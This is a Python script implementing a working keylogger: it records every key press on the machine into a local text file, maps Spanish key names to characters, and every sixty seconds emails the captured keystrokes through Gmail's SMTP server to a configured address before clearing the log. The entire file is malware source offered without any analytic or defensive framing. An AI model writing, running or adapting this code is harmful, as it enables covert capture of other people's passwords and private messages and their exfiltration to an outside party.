# Python 3.x 64-bit Interpreter

from email.message import EmailMessage

import datetime
import smtplib
import ssl
import time

import keyboard

wait_seconds = 60
ctrl_count = 0
timeout = time.time() + wait_seconds
file_log = './data/records.txt'
events_to_replace = {
    'space': ' ',
    'enter': '\n',
    'tab': '\t',
    'esc': '',
    'bloq mayus': '',
    'mayusculas': '',
    'ctrl derecha': '',
    'windows izquierda': '',
    'aplicacion': '',
    'flecha arriba': '',
    'flecha abajo': '',
    'flecha derecha': '',
    'flecha izquierda': '',
    'decimal': '.'
}

for _ in keyboard.all_modifiers:
    events_to_replace[_] = ''


def time_out():
    if time.time() > timeout:
        return True
    else:
        return False


def send_email(user, pwd, recipient, subject, body):
    gmail_user = user
    gmail_password = pwd
    sender = user
    receiver = recipient if type(recipient) is list else [recipient]
    mail_subject = subject
    mail_text = body

    message = EmailMessage()
    message['Subject'] = mail_subject
    message['From'] = sender
    message['To'] = receiver

    message.set_content(mail_text)

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(gmail_user, gmail_password)
            print('logged in')
            server.send_message(message)
            print("mail sent")
            with open(file_log, 'w') as f:
                f.write('')
    except smtplib.SMTPException as e:
        print(e.__str__())


def format_and_send_email():
    with open(file_log, 'r+') as f:
        actual_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = 'Log recorded at: ' + actual_date + '\n' + data
        send_email(
            'sender email',
            'sender password',
            'receiver email',
            'New record - ' + actual_date,
            data
        )

        f.seek(0)
        f.truncate(0)


def remove_char():
    file = open(file_log, 'r+')
    lines = file.readlines()
    file.close()

    line = lines[-1]
    lines = lines[:-1]
    lines.append(line[:-1])

    file = open(file_log, 'w+')
    file.writelines(lines)
    file.close()


def on_keyboard_event(event: keyboard.KeyboardEvent):
    key = event.name
    global ctrl_count
    if key == 'ctrl':
        ctrl_count += 1
    else:
        ctrl_count = 0

    if key == 'backspace':
        remove_char()
    else:
        with open(file_log, 'a+') as file:
            try:
                key = events_to_replace[key]
                file.write(key)
            except KeyError:
                file.write(key)


keyboard.on_press(on_keyboard_event, suppress=False)

while True:
    if time_out():
        format_and_send_email()
        timeout = time.time() + wait_seconds

    if ctrl_count >= 3:
        exit()
